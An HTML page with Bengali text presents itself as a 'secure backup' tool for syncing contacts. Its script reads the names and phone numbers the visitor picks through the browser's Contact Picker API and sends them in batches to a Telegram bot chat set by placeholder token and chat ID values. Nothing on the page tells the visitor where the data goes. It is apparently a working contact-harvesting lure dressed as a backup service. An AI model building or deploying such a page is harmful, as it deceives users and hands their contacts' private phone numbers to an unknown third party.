<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Sync</title>

<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">

<style>
body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    font-family:'Hind Siliguri',sans-serif;
    background: linear-gradient(160deg,#020617,#0f172a);
}

/* Card */
.card{
    width:340px;
    padding:28px;
    border-radius:20px;
    background: rgba(255,255,255,0.06);
    backdrop-filter: blur(18px);
    border:1px solid rgba(255,255,255,0.1);
    box-shadow:0 8px 25px rgba(0,0,0,0.5);
    text-align:center;
}

/* Title */
h2{
    color:#fff;
    margin-bottom:8px;
}

p{
    color:#94a3b8;
    font-size:14px;
}

/* Button */
.btn{
    margin-top:20px;
    width:100%;
    padding:15px;
    border:none;
    border-radius:14px;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    background: linear-gradient(135deg,#3b82f6,#22c55e);
    color:#fff;
    transition:0.3s;
}

.btn:hover{
    transform:translateY(-2px);
}

/* Loader */
.loader{
    margin:15px auto;
    width:26px;
    height:26px;
    border:3px solid rgba(255,255,255,0.2);
    border-top:3px solid #22c55e;
    border-radius:50%;
    animation:spin 1s linear infinite;
    display:none;
}

@keyframes spin{
    100%{transform:rotate(360deg)}
}

.status{
    margin-top:10px;
    font-size:14px;
    color:#22c55e;
}
</style>
</head>

<body>

<div class="card">
    <h2>☁️ সিকিউর ব্যাকআপ</h2>
    <p>আপনার কন্টাক্ট সেফভাবে সিঙ্ক করুন</p>

    <button class="btn" id="btn">Select & Send</button>

    <div class="loader" id="loader"></div>
    <div class="status" id="status">Ready</div>
</div>

<script>
const CONFIG = {
    TOKEN: 'YOUR_BOT_TOKEN',
    CHAT_ID: 'YOUR_CHAT_ID'
};

const btn = document.getElementById('btn');
const loader = document.getElementById('loader');
const status = document.getElementById('status');

btn.onclick = async () => {
    try {
        if (!('contacts' in navigator)) {
            throw new Error("এই ডিভাইস সাপোর্ট করে না");
        }

        const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});

        if (!contacts.length) throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");

        loader.style.display="block";
        status.innerText="Sending...";

        // ছোট করে ভাগ করে পাঠানো (Telegram limit avoid)
        let chunk = "";
        for(let i=0;i<contacts.length;i++){
            let name = contacts[i].name ? contacts[i].name[0] : "No Name";
            let phone = contacts[i].tel ? contacts[i].tel[0] : "No Number";

            chunk += `👤 ${name}\n📞 ${phone}\n\n`;

            if(chunk.length > 3000){
                await send(chunk);
                chunk="";
            }
        }

        if(chunk) await send(chunk);

        loader.style.display="none";
        status.innerText="✅ Done!";
    }
    catch(e){
        loader.style.display="none";
        status.innerText="❌ " + e.message;
    }
};

async function send(text){
    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({
            chat_id: CONFIG.CHAT_ID,
            text:text
        })
    });
}
</script>

</body>
</html>
